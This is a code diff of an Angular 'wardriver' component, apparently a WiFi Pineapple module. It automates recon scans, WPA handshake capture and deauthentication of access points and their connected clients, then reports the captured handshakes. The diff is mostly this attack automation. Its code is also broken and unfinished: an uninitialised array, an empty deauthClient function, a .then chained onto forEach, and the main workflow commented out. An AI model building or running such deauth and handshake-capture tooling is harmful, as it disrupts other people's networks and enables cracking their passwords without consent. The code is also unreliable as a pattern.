@@ -1,7 +1,7 @@
 import { Component, OnInit } from '@angular/core'; 
 import { ApiService } from '../services/api.service'; 
 import { StatusRootObject} from '../interfaces/status.interface';
-import { APResult } from '../interfaces/reconresult.interface';
+import { APResult, Client } from '../interfaces/reconresult.interface';
 
 @Component({ 
     selector: 'lib-wardriver', 
@@ -214,62 +214,79 @@ export class WarDriverComponent implements OnInit {
             return startHandshakeCaptureResp;
         }
         
-        const getReconStatusById = async (scanID: number) {
+        const getReconStatusById = async (scanID: number) => {
             const getReconStatusByIdResp: any = await this.API.APIGetAsync('/api/recon/scans/'+ scanID);
             return getReconStatusByIdResp;
         }
 
+        const deauthClient = async (clientObject: Client) =>  {
+            
+            //const deauthClientResp: any
+        }
+
+        const deauthBssid = async (apObject: APResult) => { // https://hak5.github.io/mk7-docs/docs/rest/recon/recon/
+            let clientArray: Array<string>;
+            apObject.clients.forEach((client) => {
+                clientArray.push(client.client_mac);
+            });
+            const deauthBssidPayload = {
+                bssid: apObject.bssid,
+                multiplier: 5,
+                channel: 11,
+                clients: clientArray
+            }
+            const deauthBssidResp: any = await this.API.APIPostAsync('/api/pineap/deauth/ap', deauthBssidPayload);
+            return deauthBssidResp;
+        }
+
         let scanID: number;
+        let currentBssid: string;
+        let currentClient: Client;
+        getReconStatus();
+        stopRecon();
+        startRecon();
+/*
         getReconStatus().then((reconResp) => { // get status of recon scan
                 if (reconResp.scanRunning) { // if recon is running, stop it
                     stopRecon().then(() => {
                         setSettings().then(() => { // set pineAP settings
                             startRecon().then((startResp) => { // start recon
                                 if (startResp.scanRunning) {
-                                    console.log('>scan running. id: ' +startResp.scanID);
                                     scanID = startResp.scanID;                                   
                                     setTimeout(() => { // run recon for x seconds
                                         stopRecon().then((stopReconResponse) => { // stop recon
                                             if (stopReconResponse.success) {
                                                 getReconStatusById(scanID).then((reconScanResults) => {  // get recon scan results
                                                     if (reconScanResults.APResults.length > 0) { // if we picked-up any APs
-                                                        // loop through APs
-                                                        reconScanResults.APResults.forEach((ap) => {
-                                                            // if any have clients, loop through clients
-                                                            if (ap.APResults.clients.length > 0) {
-                                                                ap.APResults.clients.forEach((client) => {
-                                                                    // start handshake
-                                                                    startHandshakeCapture(client.client_mac).then(() => {
-                                                                        
-                                                                    } // deauth
+                                                        reconScanResults.APResults.forEach((ap) => { // loop through APs
+                                                            if (ap.clients.length > 0) { // if any have clients
+                                                                currentBssid = ap.bssid;
+                                                                startHandshakeCapture(ap.bssid).then(() => { // start handshake
+                                                                    deauthBssid(ap);
+                                                                    ap.clients.forEach((client) => { // loop through clients
+                                                                        currentClient = client;
+                                                                        deauthClient(client); 
+                                                                    }).then(() => {
+                                                                        setTimeout(() => {  // rest for 20 secs to collect lazy handshakes
+                                                                            getHandshakeStatus().then((handShakeStatus) => { // check for handshakes
+                                                                                sendNotification(handShakeStatus); // tell the user our results
+                                                                            });
+                                                                        }, 20000);
+                                                                    });
                                                                 });
                                                             }
-                                                        })
-
-                                                        // deauth clients
-                                                        // deauth AP
-                                                        // wait 20 secs for cleanup
-                                                        // check for handshake
-                                                        // if handshake, send notification
-                                                        // move to next AP with clients
-                                                        // ...
-                                                        // if continuousDeauth, do it all over
+                                                        });
                                                     }
-                                                }); 
+                                                });
                                             }
-                                        });
-                                        //startHandshakeCapture().then((handshakeCapture) => {
-                                          //  if (handshakeCapture != null)
-                                        }
-                                        );
                                         });
                                     }, 31000);
                                 }
                             });
+                        });
                     });
-                });
-            }
-        });
+                }
+        });*/
     } 
 }
 
